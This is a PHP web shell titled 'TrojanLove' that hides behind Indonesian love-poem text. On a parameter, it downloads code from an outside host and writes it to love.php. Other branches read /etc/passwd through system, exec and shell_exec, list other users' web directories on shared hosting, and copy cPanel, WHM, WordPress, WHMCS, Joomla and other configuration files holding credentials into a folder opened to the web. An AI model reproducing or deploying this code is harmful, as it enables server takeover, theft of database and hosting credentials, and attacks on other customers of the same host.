 <?php
/* Mencoba selalu menyayangimu */
/* Walau engkau tak pernah menyadarinya */
echo "<!Mencoba menyayangimu>
<title>/* Priv8 */</title>
<center>
<br>
<br>
<h1>TrojanLove</h1>
<font color='red'>Aku tau kamu lebih memilihnya..<br>Ya.. aku memang bukan siapa siapa..<br>Aku bukan apa apanya dengan pacar barumu..<br>Dia kaya..<br>Dia sempurna..<br>Sedangkan aku.. aku bukan siapa siapa..<br>Aku bukan apa apa..<br><br>Trojan with Love</font>
</center>";
if($_GET['aku'] == 'kamu') {
$cinta1 = $_GET['dir'];
$cinta2 = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$love1 = file_get_contents('http://teachpc.ir/new.txt');
$love2 = 'love.php';
$love3 = fopen($love2, 'a');
fwrite($love3, "$love1");
fclose($love3);
echo "<br><br><center><font color='green'><a href='$cinta2/love.php' style='text-decoration: none;' target='_blank'>Aku menyayangimu :)</a></font></center>";
}
elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Kaga bisa baca /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Kaga bisa baca /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_jembot_jump) {
				$user_jumping_dir = "/home/$user_jembot_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=green>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_jembot_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Cewek di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
}
elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Kaga bisa baca /etc/passwd</font></pre>");
	$jembot = mkdir("jembot_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("jembot_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Kaga bisa baca /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_jembot) {
				$user_config_dir = "/home/$user_jembot/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_jembot/.my.cnf" => "cpanel",
						"/home/$user_jembot/.accesshash" => "WHM-accesshash",
						"/home/$user_jembot/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_jembot/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_jembot/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_jembot/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_jembot/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_jembot/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_jembot/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_jembot/public_html/forum/config.php" => "phpBB",
						"/home/$user_jembot/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_jembot/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_jembot/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_jembot/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_jembot/public_html/configuration.php" => "Joomla",
						"/home/$user_jembot/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_jembot/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_jembot/public_html/wp-config.php" => "WordPress",
						"/home/$user_jembot/public_html/admin/config.php" => "OpenCart",
						"/home/$user_jembot/public_html/slconfig.php" => "Sitelok",
						"/home/$user_jembot/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("jembot_config/$user_jembot-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/jembot_config'><font color=green>Zeeb</font></a></center>";
}
elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
}
elseif($_GET['do'] == 'con') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("monkey_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("monkey_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_cox) {
			$user_config_dir = "/home/$user_cox/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_cox/.my.cnf" => "cpanel",
					"/home/$user_cox/.accesshash" => "WHM-accesshash",
					"/home/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_cox/public_html/configuration.php" => "Joomla",
					"/home/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_cox/.my.cnf" => "cpanel",
					"/home1/$user_cox/.accesshash" => "WHM-accesshash",
					"/home1/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home1/$user_cox/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_cox/public_html/configuration.php" => "Joomla",
					"/home1/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home1/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_cox/.my.cnf" => "cpanel",
					"/home2/$user_cox/.accesshash" => "WHM-accesshash",
					"/home2/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home2/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_cox/public_html/configuration.php" => "Joomla",
					"/home2/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home2/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_cox/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_cox/.my.cnf" => "cpanel",
					"/home3/$user_cox/.accesshash" => "WHM-accesshash",
					"/home3/$user_cox/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_cox/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_cox/public_html/forum/config.php" => "phpBB",
					"/home3/$user_cox/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_cox/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_cox/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_cox/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_cox/public_html/configuration.php" => "Joomla",
					"/home3/$user_cox/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/wp-config.php" => "WordPress",
					"/home3/$user_cox/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_cox/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_cox/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("monkey_config/$user_cox-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/monkey_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"HAJAR BOSS\"></td></tr></center>\n";
        }
}
?>